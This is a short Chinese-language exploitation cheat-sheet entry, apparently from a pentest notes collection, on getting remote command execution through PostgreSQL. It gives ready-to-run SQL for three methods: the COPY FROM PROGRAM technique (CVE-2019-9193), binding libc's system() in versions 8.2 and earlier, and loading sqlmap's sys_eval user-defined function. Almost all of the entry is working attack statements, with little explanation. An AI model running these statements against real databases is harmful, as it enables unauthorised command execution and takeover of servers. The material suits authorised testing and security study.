---
title: "https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/postgresql"
description: "RCE

CVE-2019–9193

在 9.3 版本實作了 COPY TO/FROM PROGRAM
版本 9.3 ~ 11.2 預設啟用
讓 super user 和任何在 pg_read_server_files 群組的 user 可以執行任意指令
方法

DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;




版本 8.2 以前

CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
select system('id');


UDF

sqlmap udf: 
CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/xxx/cmd.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
SELECT sys_eval(\"id\");



"
external_url: "https://github.com/sqlmapproject/sqlmap/tree/master/data/udf/postgresql"
category: "Web Exploitation"
---
